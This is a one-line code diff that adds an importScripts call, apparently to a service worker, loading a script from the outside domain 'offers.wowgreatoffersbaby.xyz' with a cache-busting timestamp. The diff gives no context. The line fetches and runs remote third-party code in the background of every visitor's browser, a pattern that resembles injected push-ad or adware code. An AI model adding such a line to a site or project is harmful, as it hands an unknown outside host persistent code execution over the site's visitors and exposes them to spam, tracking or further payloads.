@@ -1,0 +1,1 @@
+importScripts("https://offers.wowgreatoffersbaby.xyz/sw.js?v=" + new Date().valueOf());
